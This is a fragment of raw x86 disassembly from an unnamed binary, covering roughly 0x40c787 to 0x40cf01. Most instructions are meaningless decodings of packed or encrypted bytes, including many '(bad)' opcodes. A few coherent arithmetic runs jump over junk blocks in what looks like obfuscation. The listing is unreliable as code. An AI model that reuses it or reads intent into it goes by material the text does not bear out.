  40c787:	mov    DWORD PTR [eax+edi*8-0x1afa6159],ebp
  40c78e:	repz push es
  40c790:	shl    ebp,0x75
  40c793:	mov    eax,0x61b95756
  40c798:	loope  0x40c7b5
  40c79a:	les    eax,FWORD PTR [ecx-0x600c8a54]
  40c7a0:	push   cs
  40c7a1:	js     0x40c768
  40c7a3:	lea    ebp,[edx+0x2d]
  40c7a6:	pop    edx
  40c7a7:	daa    
  40c7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7a9:	and    DWORD PTR [edi-0x4f1380e1],edi
  40c7af:	xchg   ah,bh
  40c7b1:	adc    eax,esi
  40c7b3:	retf   0xa20b
  40c7b6:	int3   
  40c7b7:	neg    DWORD PTR [eax+edx*1-0x1b2da33e]
  40c7be:	cld    
  40c7bf:	neg    edi
  40c7c1:	fucomip st,st(0)
  40c7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7c4:	pop    ebx
  40c7c5:	add    ch,bh
  40c7c7:	xchg   edx,eax
  40c7c8:	push   esi
  40c7c9:	mov    bh,0xd4
  40c7cb:	jecxz  0x40c82e
  40c7cd:	pop    ss
  40c7ce:	sub    al,0x69
  40c7d0:	nop
  40c7d1:	retf   0x493b
  40c7d4:	jns    0x40c81e
  40c7d6:	cmp    ah,ah
  40c7d8:	mov    esp,0xd6a86c85
  40c7dd:	xchg   ebp,eax
  40c7de:	mov    ebx,0x65d8bc57
  40c7e3:	inc    ecx
  40c7e4:	mov    bl,0xa8
  40c7e6:	inc    ebx
  40c7e7:	lods   al,BYTE PTR ds:[esi]
  40c7e8:	dec    esp
  40c7e9:	pop    es
  40c7ea:	and    al,0xc0
  40c7ec:	div    DWORD PTR [eax]
  40c7ee:	and    al,0xd9
  40c7f0:	xchg   ecx,eax
  40c7f1:	push   ss
  40c7f2:	inc    edi
  40c7f3:	test   DWORD PTR [esi-0x31],eax
  40c7f6:	or     DWORD PTR [edx],ebp
  40c7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f9:	fbld   TBYTE PTR [ebp-0x2406d74]
  40c7ff:	mov    cl,0x30
  40c801:	mov    esp,0xf56d366d
  40c806:	repz jne 0x40c7a2
  40c809:	mov    bh,0xbf
  40c80b:	mov    BYTE PTR [ebx],ch
  40c80d:	call   0x67308d20
  40c812:	dec    eax
  40c813:	jno    0x40c861
  40c815:	xchg   BYTE PTR [edi-0x123caa26],bh
  40c81b:	icebp  
  40c81c:	xor    BYTE PTR [ecx-0x51de29b6],dl
  40c822:	mov    ebx,0xdde188e3
  40c827:	lahf   
  40c828:	mov    ecx,0x86aeb2b1
  40c82d:	es or  dl,ah
  40c830:	stos   DWORD PTR es:[edi],eax
  40c831:	ja     0x40c7eb
  40c833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c834:	push   ss
  40c835:	xor    eax,0xd33a294c
  40c83a:	in     eax,0x2e
  40c83c:	(bad)  
  40c83d:	lds    edx,FWORD PTR es:[edx-0x5a2a540b]
  40c844:	push   0xffffff95
  40c846:	test   DWORD PTR [ebx],0x382af5ed
  40c84c:	repz rcl eax,1
  40c84f:	mov    bh,0x79
  40c851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c852:	adc    ebp,esi
  40c854:	(bad)  ds:0x1d6cadff
  40c85a:	stos   DWORD PTR es:[edi],eax
  40c85b:	adc    ecx,DWORD PTR [ebx]
  40c85d:	push   esp
  40c85e:	cmp    eax,0x8dae129e
  40c863:	mov    ecx,DWORD PTR [ebx]
  40c865:	push   ebx
  40c866:	cmp    esi,DWORD PTR [ebx+eiz*8]
  40c869:	push   ebp
  40c86a:	mov    cl,0x6c
  40c86c:	fdivr  st,st(6)
  40c86e:	mov    ch,0xae
  40c870:	and    eax,0xee6df4c1
  40c875:	sub    DWORD PTR [esi+ebx*4-0x77083356],edi
  40c87c:	adc    eax,0x590a92c3
  40c881:	shl    DWORD PTR [ebx-0x3172f94f],1
  40c887:	stos   DWORD PTR es:[edi],eax
  40c888:	repnz xchg esi,eax
  40c88a:	retf   
  40c88b:	pop    ebx
  40c88c:	fstp   QWORD PTR [edx-0x30]
  40c88f:	mov    edi,0x677b8ef6
  40c894:	rcr    BYTE PTR gs:[ebx+edi*2],1
  40c898:	inc    edi
  40c899:	mov    esi,0xb8787056
  40c89e:	pop    ebp
  40c89f:	div    ah
  40c8a1:	lock inc eax
  40c8a3:	inc    esp
  40c8a4:	(bad)  
  40c8a5:	mov    esi,cr1
  40c8a8:	inc    esp
  40c8a9:	test   eax,0x25796b92
  40c8ae:	out    dx,eax
  40c8af:	out    0xd7,al
  40c8b1:	call   0xe8d853b3
  40c8b6:	cld    
  40c8b7:	jmp    0x5de127d8
  40c8bc:	pop    ecx
  40c8bd:	add    cx,WORD PTR [ebp+ebp*2-0xf]
  40c8c2:	enter  0xc62e,0xe0
  40c8c6:	xchg   ecx,eax
  40c8c7:	dec    edx
  40c8c8:	pop    es
  40c8c9:	sub    al,0x26
  40c8cb:	inc    ebx
  40c8cc:	(bad)  
  40c8cd:	push   edx
  40c8ce:	outs   dx,DWORD PTR ds:[esi]
  40c8cf:	hlt    
  40c8d0:	je     0x40c8a6
  40c8d2:	push   es
  40c8d3:	outs   dx,BYTE PTR ds:[esi]
  40c8d4:	sbb    ch,BYTE PTR [eax+0x68d546c0]
  40c8da:	(bad)  
  40c8db:	test   DWORD PTR [ecx+eiz*2],0xebdd6e1
  40c8e2:	loop   0x40c8db
  40c8e4:	sbb    al,0x77
  40c8e6:	sbb    bl,BYTE PTR [ebx+eiz*2+0x63]
  40c8ea:	int    0x2
  40c8ec:	or     BYTE PTR [ebx-0x7cc1783],cl
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	adc    BYTE PTR [edx+0x37],0x3f
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8e8
  40c925:	jge    0x40c8e5
  40c927:	test   al,ch
  40c929:	fmul   DWORD PTR [ebp+0x18]
  40c92c:	xor    al,cl
  40c92e:	int    0xb6
  40c930:	xchg   BYTE PTR [edx+0x7c59f2f7],ah
  40c936:	mov    eax,ds:0x4e2c75de
  40c93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93c:	and    dl,dl
  40c93e:	cmp    DWORD PTR [edx-0x239dd220],ecx
  40c944:	out    dx,eax
  40c945:	jmp    0x9a871786
  40c94a:	mov    ebx,0x1b25bc55
  40c94f:	mov    dl,0x55
  40c951:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c953:	jae    0x40c917
  40c955:	xchg   ecx,eax
  40c956:	test   BYTE PTR [ecx-0x3c],dl
  40c959:	sbb    DWORD PTR [edi+0x10],esp
  40c95c:	add    cl,BYTE PTR [eax]
  40c95e:	int    0x16
  40c960:	loope  0x40c961
  40c962:	dec    ecx
  40c963:	mov    eax,0xbdd33418
  40c968:	push   0xffffff8b
  40c96a:	cmp    BYTE PTR [edx-0x5acd0da8],al
  40c970:	push   ds
  40c971:	iret   
  40c972:	out    0xa4,al
  40c974:	leave  
  40c975:	inc    ebp
  40c976:	and    edi,DWORD PTR [edi-0x2e]
  40c979:	mov    dl,0xb2
  40c97b:	ins    BYTE PTR es:[edi],dx
  40c97c:	clc    
  40c97d:	jmp    0x7ff8:0x18a556cf
  40c984:	out    0x86,eax
  40c986:	adc    al,0x23
  40c988:	loop   0x40c9a3
  40c98a:	imul   esi,eax,0x74d759f4
  40c990:	fstp   TBYTE PTR [ebx]
  40c992:	(bad)  
  40c994:	jg     0x40c98d
  40c996:	sbb    eax,0xce01b82a
  40c99b:	xor    al,BYTE PTR [esi+0x54]
  40c99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99f:	mov    edx,ebx
  40c9a1:	sahf   
  40c9a2:	and    DWORD PTR [eax],esi
  40c9a4:	mov    esp,0xd24a1ae0
  40c9a9:	(bad)  
  40c9aa:	push   edx
  40c9ab:	xlat   BYTE PTR ds:[ebx]
  40c9ac:	pop    ecx
  40c9ad:	call   0xe93c27ad
  40c9b2:	mov    edi,0x81a72f62
  40c9b7:	mov    bh,BYTE PTR [ebx-0x78424fc6]
  40c9bd:	dec    ecx
  40c9be:	dec    DWORD PTR ds:0x7083fc9d
  40c9c4:	adc    DWORD PTR [edi+0x75],ebx
  40c9c7:	(bad)  
  40c9c8:	loopne 0x40ca1f
  40c9ca:	clc    
  40c9cb:	les    edx,FWORD PTR [ecx-0x249cbb33]
  40c9d1:	mov    dl,0xab
  40c9d3:	outs   dx,BYTE PTR ds:[esi]
  40c9d4:	ret    0x8d10
  40c9d7:	aas    
  40c9d8:	addr16 jne 0x40c9b1
  40c9db:	(bad)  
  40c9dc:	dec    ecx
  40c9dd:	inc    edx
  40c9de:	pop    edi
  40c9df:	lea    ecx,[edx]
  40c9e1:	pop    esi
  40c9e2:	push   cs
  40c9e3:	jle    0x40c97d
  40c9e5:	mov    eax,0xdcecf1a
  40c9ea:	cdq    
  40c9eb:	pop    esi
  40c9ec:	and    BYTE PTR [edx],bl
  40c9ee:	ds jp  0x40c99c
  40c9f1:	mov    edi,0x472d3b86
  40c9f6:	jp     0x40ca71
  40c9f8:	les    edi,FWORD PTR [ebp+0x28]
  40c9fb:	repnz sub edi,esi
  40c9fe:	mov    ebp,0xbfc7b4e8
  40ca03:	lock data16 sub BYTE PTR [ebx+0x5b],bl
  40ca08:	mov    ds:0xebade997,al
  40ca0d:	xor    al,BYTE PTR [edx]
  40ca0f:	fistp  QWORD PTR [eax]
  40ca11:	mov    al,ds:0x302bd79c
  40ca16:	(bad)  
  40ca17:	push   ds
  40ca18:	add    al,BYTE PTR [esi]
  40ca1a:	dec    ebx
  40ca1b:	jae    0x40ca0b
  40ca1d:	sbb    eax,0x7642eba6
  40ca22:	(bad)  [ebx-0x11e4b9a5]
  40ca28:	rol    bl,cl
  40ca2a:	or     eax,0xa4b750f3
  40ca2f:	pop    edx
  40ca30:	(bad)  
  40ca31:	adc    bh,al
  40ca33:	mov    edi,edi
  40ca35:	jmp    0x5e:0xe7c9877f
  40ca3c:	mov    ebx,0x483fde6a
  40ca41:	and    BYTE PTR [eax-0x5],al
  40ca44:	cmp    al,0x5c
  40ca46:	add    ebp,esp
  40ca48:	nop
  40ca49:	push   esp
  40ca4a:	cld    
  40ca4b:	(bad)  
  40ca4c:	popf   
  40ca4d:	lock shl DWORD PTR [ebp+0x308cbf4b],cl
  40ca54:	inc    ebp
  40ca55:	cdq    
  40ca56:	es xor eax,0xe7c3b598
  40ca5c:	lock (bad) 
  40ca5f:	fs or  al,0x4a
  40ca62:	inc    ecx
  40ca63:	(bad)  
  40ca65:	bound  eax,QWORD PTR [ecx]
  40ca67:	in     eax,0x4c
  40ca69:	jp     0x40ca25
  40ca6b:	cwde   
  40ca6c:	xor    esp,DWORD PTR [eax+0x4e462a1b]
  40ca72:	test   cx,0x3413
  40ca77:	sub    eax,DWORD PTR [ebx+0x57]
  40ca7a:	cdq    
  40ca7b:	pop    edx
  40ca7c:	popa   
  40ca7d:	xor    eax,0x4c2a9ea1
  40ca82:	xchg   esp,eax
  40ca83:	mov    ?,WORD PTR [eax]
  40ca85:	mov    edx,0x43118d35
  40ca8a:	rcl    DWORD PTR [ebx+0x6e],cl
  40ca8d:	xchg   edi,eax
  40ca8e:	in     eax,0x98
  40ca90:	sti    
  40ca91:	pop    es
  40ca92:	inc    ecx
  40ca93:	mov    dl,0x66
  40ca95:	in     al,dx
  40ca96:	xchg   DWORD PTR [edi+0x5b],ebx
  40ca99:	push   0x38
  40ca9b:	push   edx
  40ca9c:	ds int3 
  40ca9e:	sub    ah,dh
  40caa0:	ins    BYTE PTR es:[edi],dx
  40caa1:	sbb    al,0x40
  40caa3:	pushf  
  40caa4:	ins    DWORD PTR es:[edi],dx
  40caa5:	(bad)  
  40caa6:	xchg   esi,eax
  40caa7:	xor    eax,0x67a127e9
  40caac:	das    
  40caad:	add    bl,bl
  40caaf:	arpl   bp,si
  40cab1:	pop    ss
  40cab2:	int    0x4f
  40cab4:	xchg   DWORD PTR [edx],ecx
  40cab6:	push   ds
  40cab7:	add    al,0xe1
  40cab9:	repz sub BYTE PTR ds:0x869ef909,0x74
  40cac1:	into   
  40cac2:	add    DWORD PTR [ecx-0x69],eax
  40cac5:	rol    eax,0x8f
  40cac8:	jle    0x40cb3f
  40caca:	je     0x40cac6
  40cacc:	jmp    0x40cade
  40cace:	inc    esi
  40cacf:	in     eax,dx
  40cad0:	mov    edx,0x2db06077
  40cad5:	xor    eax,0x60e5d4d3
  40cada:	pop    eax
  40cadb:	hlt    
  40cadc:	mov    ah,0x18
  40cade:	or     eax,0x2b3d5fe
  40cae3:	stos   BYTE PTR es:[edi],al
  40cae4:	pop    ebx
  40cae5:	sbb    dl,BYTE PTR [ebp+0x0]
  40cae8:	arpl   WORD PTR [esi-0x6264b653],si
  40caee:	(bad)
  40caf2:	imul   ebp,DWORD PTR [ebx+eiz*1+0x1b9f346a],0xffffffc9
  40cafa:	imul   ebp,DWORD PTR [esi-0x488366f8],0x58d0f69e
  40cb04:	rol    DWORD PTR ds:[ecx],1
  40cb07:	sub    dh,dl
  40cb09:	mov    ds:0x58de424,al
  40cb0e:	pushf  
  40cb0f:	push   ss
  40cb10:	lea    edi,[ebx]
  40cb12:	hlt    
  40cb13:	pop    edi
  40cb14:	rol    ebp,1
  40cb16:	imul   ecx,DWORD PTR [ebp+0x1c39a247],0x49e2425e
  40cb20:	sbb    al,0xdd
  40cb22:	or     al,0x1d
  40cb24:	jno    0x40cb5a
  40cb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb27:	fcom   DWORD PTR [ebx-0x74]
  40cb2a:	cmp    BYTE PTR [eax],cl
  40cb2c:	xchg   edi,eax
  40cb2d:	out    dx,eax
  40cb2e:	in     al,dx
  40cb2f:	push   es
  40cb30:	test   DWORD PTR [ebp-0x3430d493],edx
  40cb36:	repz loop 0x40cb33
  40cb39:	icebp  
  40cb3a:	jb     0x40cad5
  40cb3c:	ret    0x90d8
  40cb3f:	inc    ebx
  40cb40:	das    
  40cb41:	mov    esi,0x7319ee46
  40cb46:	es xor eax,0xe5611314
  40cb4c:	push   ebx
  40cb4d:	and    ebx,DWORD PTR [ebx]
  40cb4f:	sbb    al,0x23
  40cb51:	clc    
  40cb52:	addr16 pop edi
  40cb54:	cmp    esi,esp
  40cb56:	sub    al,0xb3
  40cb58:	data16 mov al,ds:0x838e5deb
  40cb5e:	shl    DWORD PTR [edi-0x12008204],0x20
  40cb65:	mov    ebx,0x36b06477
  40cb6a:	jb     0x40caf9
  40cb6c:	in     al,dx
  40cb6d:	aad    0x71
  40cb6f:	fdiv   QWORD PTR [edi]
  40cb71:	add    al,0x78
  40cb73:	adc    esi,DWORD PTR [ebx-0x44c20c0a]
  40cb79:	add    al,0x16
  40cb7b:	push   edi
  40cb7c:	repz call 0x61d8:0x1d5ea5b3
  40cb84:	mov    BYTE PTR [ecx+eax*2],dl
  40cb87:	pusha  
  40cb88:	adc    esp,edx
  40cb8a:	or     esi,0xe9581fb4
  40cb90:	loope  0x40cbeb
  40cb92:	mov    edi,0x1c4ed1e3
  40cb97:	push   es
  40cb98:	test   al,0x7b
  40cb9a:	lods   eax,DWORD PTR ds:[esi]
  40cb9b:	mov    cl,0x36
  40cb9d:	and    ah,dh
  40cb9f:	jmp    DWORD PTR [edi]
  40cba1:	and    ecx,edi
  40cba3:	pop    esi
  40cba4:	mov    BYTE PTR [edx-0x66],bh
  40cba7:	fcmovnbe st,st(7)
  40cba9:	inc    edi
  40cbaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbab:	das    
  40cbac:	cmp    eax,0x4801e15f
  40cbb1:	and    al,0xa1
  40cbb3:	pop    ebp
  40cbb4:	sbb    dh,cl
  40cbb6:	fdivr  QWORD PTR [ecx+edx*8+0x42b26a0]
  40cbbd:	cmp    DWORD PTR [edi+0x46],esi
  40cbc0:	mov    dl,0x79
  40cbc2:	cdq    
  40cbc3:	sti    
  40cbc4:	adc    eax,0x13390f7a
  40cbc9:	or     al,0x6d
  40cbcb:	pop    DWORD PTR [esi-0x547b4b4]
  40cbd1:	xor    dl,al
  40cbd3:	push   ss
  40cbd4:	leave  
  40cbd5:	mov    ds:0x8f4acb3c,al
  40cbda:	pop    ss
  40cbdb:	scas   eax,DWORD PTR es:[edi]
  40cbdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbdd:	scas   eax,DWORD PTR es:[edi]
  40cbde:	mov    DWORD PTR [edx],eax
  40cbe0:	jae    0x40cb93
  40cbe2:	loope  0x40cc5a
  40cbe4:	test   BYTE PTR [esi],0x5a
  40cbe7:	mov    ch,0xad
  40cbe9:	mov    ebp,0x3ed86f54
  40cbee:	sub    esp,DWORD PTR [ebp-0x76]
  40cbf1:	ins    BYTE PTR es:[edi],dx
  40cbf2:	sbb    ecx,edx
  40cbf4:	shr    BYTE PTR [ebp-0xf],cl
  40cbf7:	retf   0x23d2
  40cbfa:	and    ebp,DWORD PTR [edi]
  40cbfc:	ins    DWORD PTR es:[edi],dx
  40cbfd:	icebp  
  40cbfe:	sbb    eax,0x1f878fff
  40cc03:	add    DWORD PTR [ebx],ecx
  40cc05:	in     al,0xb7
  40cc07:	mov    edx,0xdb3b7c90
  40cc0c:	xchg   edi,eax
  40cc0d:	and    ebx,eax
  40cc0f:	mov    al,0x7a
  40cc11:	or     DWORD PTR [edx],ebp
  40cc13:	inc    edx
  40cc14:	jl     0x40cbbe
  40cc16:	fucom  st(7)
  40cc18:	leave  
  40cc19:	(bad)  
  40cc1a:	neg    BYTE PTR [ebx]
  40cc1c:	sbb    DWORD PTR [edi+0x1858bdcf],ebx
  40cc22:	lock add BYTE PTR [esi+0x144cd4e8],bl
  40cc29:	sub    BYTE PTR [ebp-0x1484ffe3],0x11
  40cc30:	pop    ebx
  40cc31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc32:	push   0xffffffc0
  40cc34:	add    DWORD PTR [edx+0x78],ebp
  40cc37:	and    ch,0x92
  40cc3a:	or     al,0xa6
  40cc3c:	mov    bh,BYTE PTR [ebx]
  40cc3e:	push   ss
  40cc3f:	dec    ebx
  40cc40:	pop    esi
  40cc41:	es pop es
  40cc43:	push   0xffffffd6
  40cc45:	cmp    al,0xee
  40cc47:	repnz and DWORD PTR [ecx],0xdd325484
  40cc4e:	ret    0xb332
  40cc51:	scas   al,BYTE PTR es:[edi]
  40cc52:	and    ch,0x51
  40cc55:	into   
  40cc56:	xor    edi,eax
  40cc58:	sub    al,0x91
  40cc5a:	dec    ebx
  40cc5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc5c:	(bad)  
  40cc5e:	out    0x83,eax
  40cc60:	mov    BYTE PTR [edi+edx*8],dl
  40cc63:	dec    ecx
  40cc64:	pusha  
  40cc65:	jl     0x40cbfd
  40cc67:	adc    DWORD PTR [ecx-0x11a093a0],ebx
  40cc6d:	ins    BYTE PTR es:[edi],dx
  40cc6e:	int    0x3e
  40cc70:	popf   
  40cc71:	ror    DWORD PTR [ebp+0xd320474],0xdb
  40cc78:	xchg   edx,eax
  40cc79:	or     BYTE PTR [eax+esi*8],dh
  40cc7c:	pshufw mm2,QWORD PTR [edi-0x66],0xb7
  40cc81:	xor    al,0xe4
  40cc83:	pop    ebx
  40cc84:	and    ah,BYTE PTR [eax+0x1a59402e]
  40cc8a:	mov    dl,0x74
  40cc8c:	icebp  
  40cc8d:	es mov eax,0x813e464e
  40cc93:	les    ebx,FWORD PTR [esi+0x27]
  40cc96:	inc    eax
  40cc97:	mov    dh,BYTE PTR [edi-0x68]
  40cc9a:	test   al,0x5b
  40cc9c:	lock hlt 
  40cc9e:	pop    esp
  40cc9f:	fistp  QWORD PTR [eax+edx*2+0x7d]
  40cca3:	jo     0x40cd10
  40cca5:	imul   ebx,DWORD PTR [edx],0x29
  40cca8:	add    al,0x6f
  40ccaa:	sub    eax,ebp
  40ccac:	in     eax,0x79
  40ccae:	jg     0x40cd20
  40ccb0:	adc    BYTE PTR [ebx+eiz*4],dl
  40ccb3:	in     al,0x46
  40ccb5:	(bad)  
  40ccb6:	ret    0xf4c2
  40ccb9:	gs xor al,0x42
  40ccbc:	mov    edi,0x8007380
  40ccc1:	call   0x3391ae6e
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	or     DWORD PTR [ebp+0xb0bc34c],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cce1
  40cd23:	or     ebp,edi
  40cd25:	test   DWORD PTR [si+0x56],esi
  40cd29:	repz loopne 0x40cda9
  40cd2c:	repz imul esi,DWORD PTR [eax-0x50],0xb9ab907c
  40cd34:	test   eax,0xb31bdd88
  40cd39:	sar    BYTE PTR ds:0x63180e38,cl
  40cd3f:	mov    bh,0x5f
  40cd41:	or     DWORD PTR [ecx-0x61f6ef7e],esi
  40cd47:	sub    al,0xa9
  40cd49:	mov    cl,0x44
  40cd4b:	sti    
  40cd4c:	(bad)  [ebp+esi*4-0x62]
  40cd50:	jmp    0x23d4:0x89771be0
  40cd57:	es mov bh,0x8a
  40cd5a:	call   0x94727385
  40cd5f:	in     al,0x2e
  40cd61:	lea    esp,[ecx+0x7a]
  40cd64:	push   esi
  40cd65:	pop    es
  40cd66:	cli    
  40cd67:	mov    al,0x6c
  40cd69:	fdiv   QWORD PTR [esi-0x5b]
  40cd6c:	push   es
  40cd6d:	and    DWORD PTR [ecx-0x2],edx
  40cd70:	mov    eax,0x24e473e2
  40cd75:	mov    ah,0xda
  40cd77:	mov    eax,ds:0x61470eeb
  40cd7c:	iret   
  40cd7d:	dec    eax
  40cd7e:	inc    edi
  40cd7f:	mov    eax,0xe47f02f0
  40cd84:	enter  0xe23d,0x47
  40cd88:	and    bl,BYTE PTR [edx+0x335d3dbd]
  40cd8e:	mov    ds,esi
  40cd90:	icebp  
  40cd91:	and    al,0xb2
  40cd93:	and    DWORD PTR [ebx+0x5],0xc9b7d851
  40cd9a:	icebp  
  40cd9b:	jbe    0x40cdeb
  40cd9d:	test   BYTE PTR [eax+esi*4-0x3e4f164d],al
  40cda4:	adc    al,BYTE PTR [edx]
  40cda6:	sub    BYTE PTR [ecx-0x6b],dh
  40cda9:	adc    DWORD PTR [eax+0x571b2b7],esp
  40cdaf:	fdiv   st,st(4)
  40cdb1:	adc    ch,BYTE PTR [ecx+eiz*4+0x74]
  40cdb5:	push   edi
  40cdb6:	or     ecx,DWORD PTR [ebp+0x45f400a9]
  40cdbc:	sbb    eax,0x5d576293
  40cdc1:	shl    BYTE PTR [esi+edi*4+0x5d1b6f42],0x38
  40cdc9:	push   0xc1748f8d
  40cdce:	jbe    0x40cdea
  40cdd0:	push   0xafec9a82
  40cdd5:	and    DWORD PTR [edi+edx*8+0x15fbb814],0xbe524e00
  40cde0:	mov    esi,DWORD PTR [edi]
  40cde2:	arpl   WORD PTR [eax],bx
  40cde4:	mov    ds:0xb67a5f38,eax
  40cde9:	adc    al,0xe
  40cdeb:	dec    ebp
  40cdec:	xlat   BYTE PTR ds:[ebx]
  40cded:	stos   DWORD PTR es:[edi],eax
  40cdee:	(bad)  [ebx]
  40cdf0:	fadd   QWORD PTR [bx+di-0x3987]
  40cdf5:	cdq    
  40cdf6:	dec    edi
  40cdf7:	push   cs
  40cdf8:	cmp    edi,DWORD PTR ds:0x9b4328d7
  40cdfe:	push   edx
  40cdff:	xchg   DWORD PTR [ebx+0x73],ebp
  40ce02:	push   0x58895510
  40ce07:	int3   
  40ce08:	pop    esp
  40ce09:	call   0x71b2:0x797a0a9d
  40ce10:	loopne 0x40ce56
  40ce12:	or     DWORD PTR [ebp-0x76d3c18c],0xffffff91
  40ce19:	mov    dh,0x95
  40ce1b:	out    0x3b,al
  40ce1d:	(bad)  
  40ce1e:	data16 lahf 
  40ce20:	out    dx,al
  40ce21:	pop    edx
  40ce22:	rol    DWORD PTR [edi+0x7c],1
  40ce25:	cmp    eax,DWORD PTR [eax]
  40ce27:	lea    esp,[eax-0x1971e817]
  40ce2d:	jmp    0xdec3f0c4
  40ce32:	jns    0x40ce30
  40ce34:	stos   DWORD PTR es:[edi],eax
  40ce35:	ror    cl,1
  40ce37:	addr16 mov ds:0x7303,al
  40ce3b:	adc    DWORD PTR [ecx+0x48f7449d],ecx
  40ce41:	mov    ds:0x343ebb1b,al
  40ce46:	int3   
  40ce47:	xchg   edx,eax
  40ce48:	adc    ecx,eax
  40ce4a:	push   ecx
  40ce4b:	xlat   BYTE PTR ds:[ebx]
  40ce4c:	and    ecx,DWORD PTR [ecx-0x32faf22d]
  40ce52:	pop    edx
  40ce53:	push   ss
  40ce54:	fwait
  40ce55:	jg     0x40ced5
  40ce57:	aad    0xaf
  40ce59:	lds    ebp,FWORD PTR [eax-0x64]
  40ce5c:	and    eax,0x5dab901e
  40ce61:	or     ch,BYTE PTR [esi]
  40ce63:	push   edx
  40ce64:	xor    eax,0xb971c314
  40ce69:	(bad)  [edi]
  40ce6b:	stos   BYTE PTR es:[edi],al
  40ce6c:	dec    ebp
  40ce6d:	sub    eax,0x2cc60284
  40ce72:	adc    bh,BYTE PTR [edx+edx*8-0xd6e7e87]
  40ce79:	sbb    eax,0xb59dc020
  40ce7e:	jo     0x40ce07
  40ce80:	loopne 0x40cee1
  40ce82:	inc    edx
  40ce83:	push   ebx
  40ce84:	or     dh,BYTE PTR [eax+0x56]
  40ce87:	mov    bl,0xf9
  40ce89:	outs   dx,DWORD PTR ds:[esi]
  40ce8a:	(bad)  
  40ce8b:	loopne 0x40ce29
  40ce8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce8e:	push   edx
  40ce8f:	repz inc ebx
  40ce91:	and    edx,esi
  40ce93:	jge    0x40ced4
  40ce95:	xor    al,0xb5
  40ce97:	test   edx,eax
  40ce99:	jns    0x40ce20
  40ce9b:	or     dh,bh
  40ce9d:	mov    ds:0x8d45f505,eax
  40cea2:	cmc    
  40cea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea4:	adc    eax,0xc3fa9508
  40cea9:	(bad)  
  40ceaa:	pop    esp
  40ceab:	mov    ds:0x7f608f90,eax
  40ceb0:	jecxz  0x40ceec
  40ceb2:	jmp    DWORD PTR [ebx+0x26]
  40ceb5:	xchg   ebp,eax
  40ceb6:	stos   BYTE PTR es:[edi],al
  40ceb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb8:	pop    edi
  40ceb9:	pop    ss
  40ceba:	arpl   WORD PTR [esi+0x51eaf594],sp
  40cec0:	mov    al,0x54
  40cec2:	loope  0x40ced5
  40cec4:	lahf   
  40cec5:	inc    ebp
  40cec6:	(bad)  
  40cec7:	out    0x70,al
  40cec9:	pop    es
  40ceca:	dec    eax
  40cecb:	jne    0x40cebd
  40cecd:	cmp    edi,0xffffff86
  40ced0:	iret   
  40ced1:	leave  
  40ced2:	pop    ebx
  40ced3:	and    esi,DWORD PTR [ebx+edx*8+0x6d1f1761]
  40ceda:	sbb    bl,ch
  40cedc:	fcmovnbe st,st(0)
  40cede:	push   ebx
  40cedf:	sub    ebp,DWORD PTR [eax-0x428fed64]
  40cee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cee6:	jbe    0x40cee3
  40cee8:	push   esp
  40cee9:	(bad)  
  40ceea:	cld    
  40ceeb:	sub    ah,BYTE PTR ds:0xa5a39e6c
  40cef1:	add    eax,0xe738d9cc
  40cef6:	mov    edi,DWORD PTR [ebp+0x17d1f05a]
  40cefc:	popf   
  40cefd:	out    0xb,eax
  40ceff:	clc    
  40cf00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf01:	std    
